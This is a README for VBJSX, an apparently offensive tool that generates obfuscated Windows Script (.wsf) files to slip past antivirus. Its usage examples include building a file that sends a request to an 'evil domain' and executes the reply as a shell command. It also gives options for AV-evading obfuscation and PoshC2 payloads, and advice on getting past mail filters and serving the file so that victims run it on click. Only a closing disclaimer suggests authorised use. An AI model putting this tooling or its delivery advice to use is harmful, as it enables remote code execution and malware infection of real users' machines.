# VBJSX
### Bypassing AV's with WSF files

_A Windows script (*.wsf) file is a text document containing Extensible Markup Language (XML) code. It incorporates several features that offer you increased scripting flexibility. Because Windows script files are not engine-specific, they can contain script from any Windows Script compatible scripting engine. They act as a container._

The mixed scripting languages will confuse most AV detection systems which allows an easy bypass.

By default the .wsf file-type gets executed by cscript which is available on most machines so no powershell is required.

---
This framework allows the easy creation of malicious wsf files, these files are invoked by VBScript and run payload functions in JSscript.


**Pros**
- Available on all systems since win9x
- Mixed scripting languages (hard to detect by AV systems)
- .wsf extension in PATHEXT so it gets executed on click
- Easy to execute shell commands, send http requests and invoke evil code

**cons**
- Pops up the CScript window (barely visible when using small code)

##Installing
```text
$ git clone https://github.com/stefan2200/VBJSX.git
$ cd VBJSX
$ python vbjsx.py
```
Generation works on all operating systems and does not require any special dependencies.

## Usage
```text
python vbjsx.py -o evil.wsf -c "cmd /C calc"
```
Open calc and exit (just double click the executable and it will run)
```text
python vbjsx.py -o evil_reverse.wsf -w -t template.example.js --cmd-ext
```
Send get request to evil domain and execute response as shell command.

_By default the strings inside functions (including the --posh-js-file code get obfuscated to evade AV signatures_

---
### Advanced usage
```text
Usage: vbjsx.py [options]

Options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output=OUTPUT
                        Output to file (default: output.wsf)
  --no-obfuscate        Do not obfuscate strings (also disables obfuscation in
                        the POSH payload)
  -c CMD, --cmd=CMD     Run a command on the target system (enables cmd shell
                        extension)
  --cmd-ext             Enable CMD shell extension (useful for templates)
  -w, --web             Allows http(s) requests using Microsoft.XmlHTTP
  -p POSH, --posh-js-file=POSH
                        Path to PoshC2 DotNet2JS.js file (works great)
  -t TEMPLATE, --template=TEMPLATE
                        Custom Javascript template
  -v                    Print debug messages

  String options:
    --entry-point=JS_ENTRY
                        The Payload entry point (default: random)
    --shell-name=SHELL_ENTRY
                        Name of the shell module (default: shell)
    --http-name=HTTP_ENTRY
                        Name of the HTTP module (default: http)
    --vb-pointer=VB_CALLER
                        Name of VBCode main function (default: random)
    --job-name=WSF_JOB  Name of the WSF job (default: random)

```

### Advanced: serving the payload
Most mail filters will not block the script because the body is valid XML and the mime type is application/xml.
It also appears to be missing from most evil extension lists.

Additionally a server.example.php file is added to serve the file using PHP. 
After visiting the page the code will get automatically executed once a target clicks the downloaded file.



Like any exploitation tool, great power comes with great responsibility. Only use against yourself and targets you are allowed to pwn. I am not responsibly for any damage done by this tool.